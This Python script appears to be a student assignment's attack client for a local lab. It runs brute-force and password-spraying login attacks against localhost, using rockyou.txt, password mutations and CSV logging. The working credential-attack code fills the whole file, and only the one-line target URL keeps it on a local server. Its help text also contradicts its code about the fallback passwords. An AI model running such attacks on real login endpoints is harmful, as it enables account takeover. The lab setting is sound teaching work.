import requests
import time
import csv
import datetime
import os
import sys
import argparse
from typing import List, Optional

# --- Configuration ---
TARGET_URL = "http://localhost:8000/login"
LOG_FILE = "attempts.csv"
GROUP_SEED = "534919433"  # Calculated XOR value from README

# Password database auto-detection paths
# The script will check these locations if no password file is specified via --password-file
# A password file is REQUIRED - the script will exit with an error if none is found
# You can download rockyou.txt from: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
PASSWORD_DB_PATHS = [
    "rockyou.txt",  # In current directory
    "passwords.txt",  # In current directory
]

# User list auto-detection paths (optional)
# The script will check these locations if no user file is specified via --user-file
USER_LIST_PATHS = [
    "users.txt",  # In current directory
    "usernames.txt",  # In current directory
]

# CSV fieldnames as required by assignment
CSV_FIELDNAMES = [
    "timestamp", "group_seed", "username", "password_attempt", 
    "attack_type", "status_code", "result", "latency_ms"
]

# Statistics tracking
attack_stats = {
    "total_attempts": 0,
    "successful_logins": 0,
    "failed_attempts": 0,
    "errors": 0,
    "start_time": None,
}


def init_log_file():
    """Create log file with headers if it doesn't exist"""
    try:
        with open(LOG_FILE, 'x', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=CSV_FIELDNAMES)
            writer.writeheader()
    except FileExistsError:
        pass  # File already exists, continue appending


def log_attempt(username, password, attack_type, status_code, result, latency):
    """Log a single attack attempt to CSV file"""
    with open(LOG_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDNAMES)
        writer.writerow({
            "timestamp": datetime.datetime.now().isoformat(),
            "group_seed": GROUP_SEED,
            "username": username,
            "password_attempt": password,
            "attack_type": attack_type,
            "status_code": status_code,
            "result": result,
            "latency_ms": f"{latency:.2f}"
        })


def update_stats(result):
    """Update attack statistics"""
    attack_stats["total_attempts"] += 1
    if result == "SUCCESS":
        attack_stats["successful_logins"] += 1
    elif result == "FAILURE":
        attack_stats["failed_attempts"] += 1
    else:
        attack_stats["errors"] += 1


def attempt_login(username, password, attack_type, timeout=5):
    """Perform a single HTTP request and measure time"""
    start_time = time.time()
    
    try:
        response = requests.post(
            TARGET_URL, 
            json={"username": username, "password": password},
            timeout=timeout
        )
        status_code = response.status_code
        # Success is usually 200, failure is 401
        result = "SUCCESS" if status_code == 200 else "FAILURE"
        
    except requests.exceptions.Timeout:
        status_code = 0
        result = "ERROR"
        print(f"[{attack_type}] Timeout for {username}")
    except requests.exceptions.RequestException as e:
        status_code = 0
        result = "ERROR"
        print(f"[{attack_type}] Connection Error for {username}: {e}")

    end_time = time.time()
    latency_ms = (end_time - start_time) * 1000
    
    # Print to screen (to see progress)
    status_symbol = "✓" if result == "SUCCESS" else "✗"
    print(f"[{attack_type}] {status_symbol} User: {username} | Pwd: {password[:20]}... | {result} ({latency_ms:.0f}ms)")
    
    # Write to log
    log_attempt(username, password, attack_type, status_code, result, latency_ms)
    
    # Update statistics
    update_stats(result)
    
    return result == "SUCCESS"


def load_password_list(file_path: Optional[str] = None, max_passwords: Optional[int] = None) -> List[str]:
    """
    Load password list from file.
    Supports compressed files (.gz) and various encodings.
    Requires a password file to be provided or found in common locations.
    """
    if file_path and os.path.exists(file_path):
        passwords = []
        try:
            # Try to handle compressed files
            if file_path.endswith('.gz'):
                import gzip
                with gzip.open(file_path, 'rt', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            else:
                # Try different encodings
                for encoding in ['utf-8', 'latin-1', 'cp1252']:
                    try:
                        with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                            passwords = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                        
            if not passwords:
                raise ValueError(f"Password file {file_path} is empty")
                
            print(f"Loaded {len(passwords)} passwords from {file_path}")
            if max_passwords:
                passwords = passwords[:max_passwords]
            return passwords
        except Exception as e:
            print(f"Error loading password file {file_path}: {e}")
            sys.exit(1)
    
    # Try to find password database in common locations
    for db_path in PASSWORD_DB_PATHS:
        if os.path.exists(db_path):
            return load_password_list(db_path, max_passwords)
    
    # No password file found - exit with error
    print("ERROR: No password file found!")
    print(f"Please provide a password file using --password-file or place one of these files in the current directory:")
    for path in PASSWORD_DB_PATHS:
        print(f"  - {path}")
    print("\nYou can download rockyou.txt from:")
    print("https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
    sys.exit(1)


def load_user_list(file_path: Optional[str] = None) -> List[str]:
    """Load user list from file or return default list"""
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(users)} users from {file_path}")
            return users
        except Exception as e:
            print(f"Error loading user file {file_path}: {e}")
    
    # Try to find user list in common locations
    for user_path in USER_LIST_PATHS:
        if os.path.exists(user_path):
            return load_user_list(user_path)
    
    # Fallback to default users
    return ["admin", "user1", "user2", "test_user", "root", "administrator", "guest"]


def generate_password_mutations(base_password: str) -> List[str]:
    """
    Generate password mutations based on common patterns:
    - Case variations
    - Number suffixes/prefixes
    - Common substitutions (leet speak)
    - Year suffixes
    """
    mutations = [base_password]
    
    # Case variations
    mutations.extend([base_password.lower(), base_password.upper(), base_password.capitalize()])
    
    # Number suffixes
    for num in ["123", "1234", "12345", "2023", "2024", "2025", "1", "12"]:
        mutations.append(base_password + num)
        mutations.append(num + base_password)
    
    # Leet speak substitutions
    leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
    leet_password = base_password.lower()
    for char, replacement in leet_map.items():
        leet_password = leet_password.replace(char, replacement)
    mutations.append(leet_password)
    
    # Special character additions
    for char in ["!", "@", "#", "$", "%"]:
        mutations.append(base_password + char)
        mutations.append(char + base_password)
    
    return list(set(mutations))  # Remove duplicates


def run_brute_force(target_user: str, password_list: List[str], 
                   use_mutations: bool = False, max_passwords: Optional[int] = None):
    """
    Enhanced Brute-Force: Try many passwords on a single user.
    Supports password mutations and external password databases.
    """
    print(f"\n{'='*60}")
    print(f"Starting Brute-Force Attack on user: {target_user}")
    print(f"{'='*60}")
    
    # Apply mutations if requested
    if use_mutations:
        print("Generating password mutations...")
        expanded_passwords = []
        for pwd in password_list[:max_passwords] if max_passwords else password_list:
            expanded_passwords.extend(generate_password_mutations(pwd))
        password_list = list(set(expanded_passwords))  # Remove duplicates
        print(f"Generated {len(password_list)} password variants")
    
    if max_passwords:
        password_list = password_list[:max_passwords]
    
    print(f"Total passwords to try: {len(password_list)}")
    
    # Sequential brute force
    for i, password in enumerate(password_list, 1):
        print(f"Progress: {i}/{len(password_list)}", end='\r')
        success = attempt_login(target_user, password, "Brute-Force")
        if success:
            print(f"\n{'='*60}")
            print(f"PASSWORD FOUND for {target_user}: {password}")
            print(f"{'='*60}\n")
            return
    
    print(f"\nBrute-Force attack completed on {target_user}")


def run_password_spraying(user_list: List[str], password_list: List[str], 
                         max_users: Optional[int] = None):
    """
    Enhanced Password-Spraying: Try common passwords on many users.
    Includes delays to avoid account lockouts.
    """
    print(f"\n{'='*60}")
    print(f"Starting Password-Spraying Attack")
    print(f"{'='*60}")
    
    if max_users:
        user_list = user_list[:max_users]
    
    print(f"Users to test: {len(user_list)}")
    print(f"Passwords to try per user: {len(password_list)}")
    print(f"Total attempts: {len(user_list) * len(password_list)}")
    
    # For password spraying, we try each password on all users before moving to next
    # This avoids rapid-fire attempts on a single user
    found_credentials = []
    
    for password_idx, password in enumerate(password_list, 1):
        print(f"\nTrying password {password_idx}/{len(password_list)}: {password}")
        
        # Sequential spraying with delay
        for user in user_list:
            success = attempt_login(user, password, "Password-Spraying")
            if success:
                found_credentials.append((user, password))
                print(f"\n{'='*60}")
                print(f"SUCCESS! Found credentials:")
                print(f"  Username: {user}")
                print(f"  Password: {password}")
                print(f"{'='*60}\n")
    
    if found_credentials:
        print(f"\n{'='*60}")
        print(f"Found {len(found_credentials)} credential(s):")
        for user, pwd in found_credentials:
            print(f"  {user}:{pwd}")
        print(f"{'='*60}\n")


def print_statistics():
    """Print attack statistics"""
    if attack_stats["start_time"]:
        elapsed = time.time() - attack_stats["start_time"]
        print(f"\n{'='*60}")
        print("Attack Statistics:")
        print(f"{'='*60}")
        print(f"Total attempts: {attack_stats['total_attempts']}")
        print(f"Successful logins: {attack_stats['successful_logins']}")
        print(f"Failed attempts: {attack_stats['failed_attempts']}")
        print(f"Errors: {attack_stats['errors']}")
        print(f"Time elapsed: {elapsed:.2f} seconds")
        if attack_stats['total_attempts'] > 0:
            print(f"Success rate: {(attack_stats['successful_logins']/attack_stats['total_attempts']*100):.2f}%")
        print(f"{'='*60}\n")


# --- Main execution ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Password-Based Authentication Analyzer - Attack Client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Brute force attack on specific user
  python3 attacker.py --attack brute-force --user admin --password-file rockyou.txt
  
  # Password spraying attack
  python3 attacker.py --attack spraying --user-file users.txt --max-passwords 20
  
  # Run both attacks
  python3 attacker.py --attack both

Note: Password database files (like rockyou.txt) are optional. If not provided,
      the script will use built-in common passwords. You can download rockyou.txt
      from: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
        """
    )
    
    parser.add_argument(
        "--attack",
        choices=["brute-force", "spraying", "both"],
        default="both",
        help="Attack type: brute-force (single user), spraying (many users), or both (default: both)"
    )
    
    parser.add_argument(
        "--user",
        type=str,
        help="Target username for brute-force attack (default: first user in user list)"
    )
    
    parser.add_argument(
        "--user-file",
        type=str,
        help="Path to file containing usernames (one per line). If not provided, uses default users."
    )
    
    parser.add_argument(
        "--password-file",
        type=str,
        help="Path to password database file (one password per line). If not provided, auto-detects or uses built-in passwords."
    )
    
    parser.add_argument(
        "--max-passwords",
        type=int,
        help="Maximum number of passwords to try (default: all passwords)"
    )
    
    parser.add_argument(
        "--max-users",
        type=int,
        help="Maximum number of users to test in spraying attack (default: all users)"
    )
    
    parser.add_argument(
        "--use-mutations",
        action="store_true",
        help="Enable password mutations for brute-force attack (leet speak, case variations, etc.)"
    )
    
    parser.add_argument(
        "--top-passwords",
        type=int,
        help="Number of top passwords to use for spraying attack (default: all passwords)"
    )
    
    args = parser.parse_args()
    
    init_log_file()
    attack_stats["start_time"] = time.time()
    
    print("="*60)
    print("Password-Based Authentication Analyzer")
    print("Enhanced Attack Client")
    print("="*60)
    
    # Load password database
    password_list = load_password_list(args.password_file, args.max_passwords)
    print(f"Loaded {len(password_list)} passwords")
    
    # Load user list
    user_list = load_user_list(args.user_file)
    print(f"Loaded {len(user_list)} users")
    
    # Execute attack based on arguments
    if args.attack == "brute-force":
        target_user = args.user if args.user else user_list[0]
        print(f"\nStarting Brute-Force attack on user: {target_user}")
        run_brute_force(
            target_user, 
            password_list, 
            use_mutations=args.use_mutations, 
            max_passwords=args.max_passwords
        )
    
    elif args.attack == "spraying":
        passwords_to_use = password_list[:args.top_passwords] if args.top_passwords else password_list
        print(f"\nStarting Password-Spraying attack")
        run_password_spraying(user_list, passwords_to_use, max_users=args.max_users)
    
    elif args.attack == "both":
        # Run both attacks
        print("\nRunning both attack types...")
        
        # 1. Brute force on first user
        target_user = args.user if args.user else user_list[0]
        run_brute_force(
            target_user, 
            password_list[:1000] if not args.max_passwords else password_list[:args.max_passwords], 
            use_mutations=args.use_mutations, 
            max_passwords=args.max_passwords or 1000
        )
        
        # 2. Password spraying with top passwords
        top_passwords = args.top_passwords if args.top_passwords else 20
        run_password_spraying(user_list, password_list[:top_passwords], max_users=args.max_users)
    
    print_statistics()